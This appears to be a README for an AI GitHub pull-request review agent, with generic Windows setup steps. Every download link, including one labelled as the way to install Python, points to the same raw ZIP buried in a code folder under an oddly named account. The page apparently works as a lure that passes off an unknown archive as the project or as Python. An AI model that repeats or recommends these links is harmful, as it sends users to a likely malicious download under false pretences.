# 🤖 smart-pr-review-agent - Faster GitHub PR Review

[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip)

## 📥 Download

Use this page to visit and download the app:

https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip

## 🧭 What this app does

smart-pr-review-agent is an AI tool that reviews GitHub pull requests, looks for bugs, and helps draft fixes. It can work in different modes, so you can choose how much control you want. It also keeps trace logs for later review.

## ✨ Main features

- Reviews pull requests with AI
- Checks code for likely bugs and edge cases
- Uses GitHub MCP to read repo context
- Uses RAG and tree-sitter to understand code structure
- Can raise issues when it finds a problem
- Can draft fixes and open pull requests
- Supports Review Only mode
- Supports Human-in-the-Loop mode
- Supports Auto-Pilot mode
- Tracks runs with LangSmith
- Runs as smart-pr-review-bot[bot]

## 🖥️ What you need on Windows

- Windows 10 or Windows 11
- An internet connection
- A GitHub account
- A web browser
- GitHub access token
- A machine with enough memory for AI tools, about 8 GB RAM or more
- Python 3.11 or later if you run it from source
- Git if you plan to clone the repo

## 🚀 Getting Started

### 1. Download the project

Open this page and download the files:

https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip

If the page offers a ZIP file, save it to your computer.

### 2. Unpack the files

If you downloaded a ZIP file:

- Find the file in your Downloads folder
- Right-click it
- Select Extract All
- Choose a folder you can find later, such as Desktop or Documents

### 3. Open the project folder

After you extract the files:

- Open the folder
- Look for files named `README.md`, `requirements.txt`, or `pyproject.toml`
- Keep this folder open for the next steps

### 4. Install Python

If Python is not on your PC:

- Go to https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip
- Download the latest Python 3 release for Windows
- Run the installer
- Check the box that says Add Python to PATH
- Finish the install

### 5. Open Command Prompt

- Press the Windows key
- Type `cmd`
- Open Command Prompt

### 6. Move into the project folder

In Command Prompt, type the path to your folder, then press Enter.

Example:

cd Desktop\smart-pr-review-agent

If your folder is in Documents, use that path instead.

### 7. Install the app files

Run the install command shown in the project files. A common setup looks like this:

pip install -r requirements.txt

If the project uses Poetry or another tool, use the install steps listed in its setup file.

### 8. Add your GitHub details

Set up the app with your GitHub token and other keys it needs.

Common items include:

- GitHub personal access token
- GitHub repository name
- LangSmith API key
- OpenAI or other model key
- GitHub MCP settings

If the project uses a `.env` file, create one in the main folder and fill in the values the app asks for.

### 9. Start the app

Run the start command from the project files. A common command looks like this:

python main.py

If the repo uses FastAPI, it may start with a command such as:

uvicorn app:app --reload

Use the exact start file listed in the project.

### 10. Open the app in your browser

If the app starts a local web page, open the address shown in Command Prompt, such as:

http://127.0.0.1:8000

If the app connects to GitHub only, sign in and follow the setup screen or config file steps.

## 🧩 Setup for GitHub access

To let the app review pull requests, it needs permission to read and act on your GitHub repo.

Use a token with the needed access:

- Read repository content
- Read pull requests
- Open issues
- Create branches
- Open pull requests if you use Auto-Pilot

If you want a safer start, use Review Only mode first.

## 🔧 Mode options

### Review Only

The app checks PRs and gives review feedback. It does not change code.

### Human-in-the-Loop

The app can prepare fixes, but you approve the action before it makes changes.

### Auto-Pilot

The app can review, draft fixes, raise issues, and open pull requests on its own.

Start with Review Only if you want to test how it works.

## 🪄 How to use it

1. Connect your GitHub account
2. Choose the repository you want to review
3. Pick a mode
4. Send a pull request to the repo
5. Let the agent scan the code
6. Review the findings
7. Accept or reject any fix the app suggests

## 📚 What the app checks

The agent can look for:

- Missing error checks
- Broken logic
- Unsafe code paths
- Weak test coverage
- Code that may fail in edge cases
- Changes that do not match the rest of the repo
- Problems in diffs and nearby code

## 🔍 How it understands code

The app uses tools that help it read code with more context:

- LangGraph for agent flow
- RAG for pulling useful repo facts
- tree-sitter for code structure
- GitHub MCP for repo access
- LangSmith for trace logs

These tools help it review more than just one file at a time

## 🛠️ Common Windows issues

### Python command not found

If Windows says Python is not found:

- Close Command Prompt
- Reopen it
- Try `python --version`
- If that fails, install Python again and check Add Python to PATH

### Permission denied

If the app cannot read or write files:

- Move the project to a folder you own, such as Documents
- Run Command Prompt as administrator
- Check that your GitHub token has the right access

### App does not start

If the app stops right away:

- Check that all install steps finished
- Make sure the model key is set
- Confirm the `.env` file has the right names and values
- Look for error text in the Command Prompt window

### GitHub access fails

If the app cannot reach your repo:

- Confirm the token is valid
- Check repo access rules
- Make sure the repo name is correct
- Refresh the token if needed

## 📂 Suggested folder layout

Your folder may look like this:

- `app/` for the main code
- `agents/` for review logic
- `prompts/` for AI prompts
- `tests/` for test files
- `.env` for private settings
- `README.md` for setup help

## 🧪 Test run

After setup, try one small PR first.

Use a safe repo and a small code change so you can see:

- What the agent flags
- How it writes comments
- Whether it opens issues
- Whether it drafts fixes the way you want

## 🔐 Keep your account safe

- Do not share your token
- Use a token with only the access you need
- Remove old tokens when you stop using them
- Keep your `.env` file private

## 📌 Repo details

- Name: smart-pr-review-agent
- Type: autonomous review agent
- Use: GitHub pull request review and bug detection
- Topics: autonomous-agents, code-review, fastapi, github-mcp, langchain, langgraph, llm, multi-agent-systems, rag, tree-sitter

## 📎 Download again

Visit this page to download or clone the project:

https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip